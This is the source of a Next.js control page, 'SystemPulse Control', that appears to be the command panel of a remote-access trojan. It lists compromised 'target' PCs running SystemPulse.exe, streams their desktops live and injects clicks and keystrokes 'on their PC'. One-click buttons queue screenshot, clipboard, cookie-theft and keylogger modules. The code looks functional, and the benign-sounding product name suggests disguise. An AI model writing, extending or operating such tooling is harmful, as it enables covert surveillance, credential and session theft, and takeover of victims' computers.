"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import Link from "next/link";
import { MODULE_CATALOG } from "@/lib/modules";

type OnlineHost = {
  hostname: string;
  username: string;
  screen_width?: number;
  screen_height?: number;
};

type AvEvent = {
  id: number;
  module: string;
  payload: Record<string, unknown> | null;
  created_at: string;
};

const FRAME_POLL_MS = 120;
const DEFAULT_INTERVAL = 0.25;

function controlHeaders(pin: string): HeadersInit {
  const h: Record<string, string> = { "Content-Type": "application/json" };
  if (pin) h["x-control-pin"] = pin;
  return h;
}

async function controlFetch(
  path: string,
  pin: string,
  options: RequestInit = {},
): Promise<Response> {
  return fetch(path, {
    ...options,
    headers: { ...controlHeaders(pin), ...(options.headers as Record<string, string>) },
  });
}

function imageSrcFromEvent(event: AvEvent | null): string | null {
  if (!event?.payload) return null;
  const b64 = event.payload.image_base64;
  if (typeof b64 !== "string") return null;
  const fmt = event.payload.image_format === "jpeg" ? "jpeg" : "png";
  return `data:image/${fmt};base64,${b64}`;
}

export default function ControlPage() {
  const [pin, setPin] = useState("");
  const [pinOk, setPinOk] = useState(false);
  const [hosts, setHosts] = useState<OnlineHost[]>([]);
  const [selected, setSelected] = useState<string>("");
  const [liveOn, setLiveOn] = useState(false);
  const [intervalSec, setIntervalSec] = useState(DEFAULT_INTERVAL);
  const [frame, setFrame] = useState<AvEvent | null>(null);
  const [text, setText] = useState("");
  const [status, setStatus] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [fps, setFps] = useState(0);
  const imgRef = useRef<HTMLImageElement>(null);
  const lastFrameId = useRef(0);
  const fpsCounter = useRef({ n: 0, t: Date.now() });

  const host = useMemo(
    () => hosts.find((h) => h.hostname === selected),
    [hosts, selected],
  );

  const screenW = Number(host?.screen_width || frame?.payload?.screen_width || 1920);
  const screenH = Number(host?.screen_height || frame?.payload?.screen_height || 1080);

  useEffect(() => {
    const saved = sessionStorage.getItem("sp-control-pin") || "";
    if (saved) {
      setPin(saved);
      setPinOk(true);
    }
  }, []);

  const refreshOnline = useCallback(async () => {
    if (!pinOk) return;
    try {
      const res = await controlFetch("/api/control/online", pin);
      if (!res.ok) throw new Error(await res.text());
      const data = await res.json();
      setHosts(data.hosts || []);
      setError(null);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to load online hosts");
    }
  }, [pin, pinOk]);

  const refreshFrame = useCallback(async () => {
    if (!pinOk || !selected) return;
    try {
      const since = lastFrameId.current > 0 ? `&since_id=${lastFrameId.current}` : "";
      const res = await controlFetch(
        `/api/control/frame?hostname=${encodeURIComponent(selected)}${since}`,
        pin,
      );
      if (!res.ok) return;
      const data = await res.json();
      const event = data.event as AvEvent | null;
      if (!event?.payload?.image_base64) return;
      lastFrameId.current = event.id;
      setFrame(event);
      fpsCounter.current.n += 1;
      const now = Date.now();
      if (now - fpsCounter.current.t >= 1000) {
        setFps(fpsCounter.current.n);
        fpsCounter.current = { n: 0, t: now };
      }
    } catch {
      /* ignore */
    }
  }, [pinOk, selected, pin]);

  useEffect(() => {
    if (!pinOk) return;
    refreshOnline();
    const t = setInterval(refreshOnline, 3000);
    return () => clearInterval(t);
  }, [pinOk, refreshOnline]);

  useEffect(() => {
    if (!pinOk || !selected || !liveOn) return;
    refreshFrame();
    const t = setInterval(refreshFrame, FRAME_POLL_MS);
    return () => clearInterval(t);
  }, [pinOk, selected, liveOn, refreshFrame]);

  function queueInput(payload: Record<string, unknown>) {
    if (!selected) return;
    void controlFetch("/api/control/command", pin, {
      method: "POST",
      body: JSON.stringify({ hostname: selected, kind: "input", payload }),
    }).catch(() => setStatus("Input queue failed"));
  }

  function runModule(module: string) {
    if (!selected) return;
    void controlFetch("/api/control/command", pin, {
      method: "POST",
      body: JSON.stringify({ hostname: selected, kind: "module", module }),
    });
    setStatus(`Queued ${module}`);
  }

  async function toggleLive(enabled: boolean) {
    if (!selected) return;
    const res = await controlFetch("/api/control/liveview", pin, {
      method: "PUT",
      body: JSON.stringify({ hostname: selected, enabled, interval: intervalSec }),
    });
    if (!res.ok) {
      setStatus(`Live view failed: ${await res.text()}`);
      return;
    }
    setLiveOn(enabled);
    if (enabled) {
      lastFrameId.current = 0;
      fpsCounter.current = { n: 0, t: Date.now() };
      refreshFrame();
      setStatus(`Turbo live ~${intervalSec}s capture · polling ${FRAME_POLL_MS}ms`);
    } else {
      setStatus("Live screen stopped");
      setFps(0);
    }
  }

  function onScreenClick(ev: React.MouseEvent<HTMLImageElement>) {
    const img = imgRef.current;
    if (!img || !selected) return;
    const rect = img.getBoundingClientRect();
    const x = Math.round(((ev.clientX - rect.left) / rect.width) * screenW);
    const y = Math.round(((ev.clientY - rect.top) / rect.height) * screenH);
    queueInput({ action: "click", x, y, button: "left", clicks: 1 });
  }

  function sendText() {
    if (!text.trim()) return;
    queueInput({ action: "type", text });
    setText("");
  }

  function tryPin() {
    sessionStorage.setItem("sp-control-pin", pin);
    setPinOk(true);
  }

  const preview = imageSrcFromEvent(frame);

  if (!pinOk) {
    return (
      <div className="shell control-shell">
        <div className="control-gate">
          <h1>Remote control</h1>
          <p>Optional PIN if set as <code>CONTROL_PIN</code> on Vercel.</p>
          <input
            className="control-input"
            type="password"
            placeholder="Control PIN (optional)"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && tryPin()}
          />
          <button className="btn btn-accent" onClick={tryPin}>
            Continue
          </button>
          <Link href="/" className="control-back">
            ← Dashboard
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="shell control-shell">
      <header className="topbar">
        <div className="brand-text">
          <h1>
            System<span>Pulse</span> Control
          </h1>
          <p>Turbo mode — ~0.25s frames · ~120ms refresh · instant input queue</p>
        </div>
        <div className="topbar-right">
          {liveOn && fps > 0 && <span className="fps-pill">{fps} fps</span>}
          <Link href="/" className="btn">
            Dashboard
          </Link>
          <button className="btn btn-accent" onClick={refreshOnline}>
            Refresh online
          </button>
        </div>
      </header>

      {error && <div className="alert">{error}</div>}
      {status && <div className="control-status">{status}</div>}

      <div className="control-grid">
        <section className="panel control-panel">
          <div className="panel-title">Online PCs</div>
          {hosts.length === 0 ? (
            <p className="empty">No one online — open SystemPulse.exe on target PC.</p>
          ) : (
            <ul className="host-list">
              {hosts.map((h) => (
                <li key={h.hostname}>
                  <button
                    type="button"
                    className={`host-btn${selected === h.hostname ? " active" : ""}`}
                    onClick={() => {
                      setSelected(h.hostname);
                      setLiveOn(false);
                      setFrame(null);
                      lastFrameId.current = 0;
                    }}
                  >
                    <strong>{h.hostname}</strong>
                    <span>{h.username}</span>
                    {h.screen_width && h.screen_height && (
                      <span className="host-meta">
                        {h.screen_width}×{h.screen_height}
                      </span>
                    )}
                  </button>
                </li>
              ))}
            </ul>
          )}
        </section>

        <section className="panel control-panel control-main">
          <div className="panel-title">
            Live screen {selected ? `— ${selected}` : ""}
          </div>
          {!selected ? (
            <p className="empty">Select a PC from the list.</p>
          ) : (
            <>
              <div className="live-toolbar">
                <label>
                  Capture (s)
                  <input
                    type="number"
                    min={0.25}
                    max={15}
                    step={0.25}
                    value={intervalSec}
                    onChange={(e) => setIntervalSec(Number(e.target.value))}
                    className="control-input narrow"
                  />
                </label>
                {!liveOn ? (
                  <button className="btn btn-accent" onClick={() => toggleLive(true)}>
                    Start turbo live
                  </button>
                ) : (
                  <button className="btn" onClick={() => toggleLive(false)}>
                    Stop
                  </button>
                )}
              </div>
              <div className="live-frame-wrap">
                {preview ? (
                  // eslint-disable-next-line @next/next/no-img-element
                  <img
                    ref={imgRef}
                    src={preview}
                    alt="Live screen"
                    className="live-frame"
                    onClick={onScreenClick}
                    title="Click = instant left-click on their PC"
                  />
                ) : (
                  <div className="live-placeholder">
                    {liveOn ? "Waiting for first frame…" : "Start turbo live to see their desktop"}
                  </div>
                )}
              </div>
              <p className="control-hint">
                Screen {screenW}×{screenH} — clicks & keys queue instantly (~0.1s on their PC). Latest exe +
                Run as administrator required.
              </p>

              <div className="control-row">
                <input
                  className="control-input flex"
                  value={text}
                  onChange={(e) => setText(e.target.value)}
                  placeholder="Type on their PC — Enter to send"
                  onKeyDown={(e) => {
                    if (e.key === "Enter") {
                      e.preventDefault();
                      sendText();
                    }
                  }}
                />
                <button className="btn btn-accent" onClick={sendText}>
                  Send
                </button>
                <button className="btn" onClick={() => queueInput({ action: "key", key: "enter" })}>
                  Enter
                </button>
                <button className="btn" onClick={() => queueInput({ action: "key", key: "backspace" })}>
                  ⌫
                </button>
              </div>

              <div className="module-quick">
                {MODULE_CATALOG.filter((m) =>
                  ["screenshot", "clipboard", "cookies", "keylogger"].includes(m.id),
                ).map((m) => (
                  <button key={m.id} type="button" className="btn" onClick={() => runModule(m.id)}>
                    {m.label}
                  </button>
                ))}
              </div>
            </>
          )}
        </section>
      </div>
    </div>
  );
}
